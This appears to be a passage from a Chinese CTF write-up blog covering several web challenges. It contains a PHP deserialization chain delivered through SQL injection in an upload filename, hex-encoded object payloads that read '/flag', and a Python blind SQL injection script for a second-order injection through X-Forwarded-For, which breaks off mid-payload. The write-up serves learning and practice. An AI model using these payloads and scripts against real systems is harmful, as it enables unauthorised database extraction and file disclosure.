variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r00t"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r00t"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pic_base"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Connect MySQL Fail:"</span><span class="token operator">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql_fields</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql_val</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$key_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$value_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql_fields</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"`"</span><span class="token operator">.</span><span class="token variable">$key_temp</span><span class="token operator">.</span><span class="token string double-quoted-string">"`"</span><span class="token punctuation">;</span><span class="token variable">$sql_val</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"'"</span><span class="token operator">.</span><span class="token variable">$value_temp</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO images ("</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_fields</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">") VALUES("</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_val</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">;</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysqli_insert_id</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">view_files</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ifview</span> <span class="token operator">==</span> <span class="token constant boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span><span class="token comment">//The function is not yet perfect, it is not open yet.</span><span class="token punctuation">&#125;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment"># Read some config html</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//upload.php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./helper.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">upload</span> <span class="token keyword">extends</span> <span class="token class-name">helper</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload_base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Upload file failed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">upload_base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//show.php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./helper.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"delete_all"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"delete_all"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$show</span><span class="token operator">-></span><span class="token function">Delete_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$show</span><span class="token operator">-></span><span class="token function">Get_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">show</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$con</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r00t"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r00t"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pic_base"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Connect MySQL Fail:"</span><span class="token operator">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Get_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM images"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$attr_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$attr_temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>id="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" filename="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" path="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>You have not uploaded an image yet.&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Delete_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"DELETE FROM images"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找到可供利用的方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">view_files</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ifview</span> <span class="token operator">==</span> <span class="token constant boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span><span class="token comment">//The function is not yet perfect, it is not open yet.</span><span class="token punctuation">&#125;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化的方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Get_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM images"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$attr_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$attr_temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>id="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" filename="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" path="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化的方法</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"title"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ext"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$img_ext</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$my_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"width"</span><span class="token operator">=></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"height"</span><span class="token operator">=></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$my_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Your images is uploaded successfully. And your image's id is <span class="token interpolation"><span class="token variable">$id</span></span>.&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先构造helper类</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">helper</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$ifview</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token operator">=</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//O:6:"helper":2:&#123;s:9:"*ifview";b:1;s:9:"*config";s:5:"/flag";&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目中会将序列化后的\0*\0转为\0\0\0再存入数据库并且在取出是逆向使用，其实对于我们的注入没有任何影响</p><p>然后查看sql语句构造方法<code>$sql = &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;</code>在该方法中，我们可以使用#截断来注释掉后面内容，在文件名处构造payload进行sql注入，而\0字符不显示，使用16进制编码来将字符串注入</p><pre class="line-numbers language-none"><code class="language-none">payload：文件名：1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>        <h2 id="极客大挑战-2020-Roamphp1-Welcome"   >          <a href="#极客大挑战-2020-Roamphp1-Welcome" class="heading-link"><i class="fas fa-link"></i></a><a href="#极客大挑战-2020-Roamphp1-Welcome" class="headerlink" title="[极客大挑战 2020]Roamphp1-Welcome"></a>[极客大挑战 2020]Roamphp1-Welcome</h2>      <p>405换POST，<code>roam1[]=1&amp;roam2[]=2</code></p>        <h2 id="RoarCTF-2019-Online-Proxy"   >          <a href="#RoarCTF-2019-Online-Proxy" class="heading-link"><i class="fas fa-link"></i></a><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2>      <p>看源码，发现注释中存在我们的信息，存在Last IP，应该是被写入了数据库，尝试在X-Forward-For处构造payload，确实存在，使用<code>1&#39; or &#39;1</code>进行测试，发现返回的Last IP变成了1，说明存在SQL注入，构造语句</p><pre class="line-numbers language-none"><code class="language-none">0&#39; or if() or &#39;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样在结果正确时就会返回1</p><p>语句的执行顺序是</p><p>1、读取IP，并且回显到Current IP位置</p><p>2、传入任意不同IP，此时Last IP中的语句被写入数据库</p><p>3、传入第二次访问的IP，此时由于与上次访问IP相同，会从数据库中取出注入的语句并且执行回显，完成注入</p><p>构造<del>偷</del>脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8 </span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">'http://node3.buuoj.cn:25869/'</span>res <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    left <span class="token operator">=</span> <span class="token number">31</span>    right <span class="token operator">=</span> <span class="token number">127</span>    mid <span class="token operator">=</span> left <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>        <span class="token comment">#payload = "0' or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))>&#123;&#125;) or '0".format(i,mid)</span>        <span class="token comment">#payload  = "0' or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = 'F4l9_D4t4B45e'),&#123;&#125;,1))>&#123;&#125;) or '0".format(i,mid)</span>        <span class="token comment">#payload  = "0' or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 'F4l9_t4b1e'),&#123;&#125;,1))>&#123;&#125;) or '0".format(i,mid)</span>        payload <span class="token operator">=</span> <span class="token string">"0' or (ascii(substr((select group_concat(F4l9_C01uMn) from 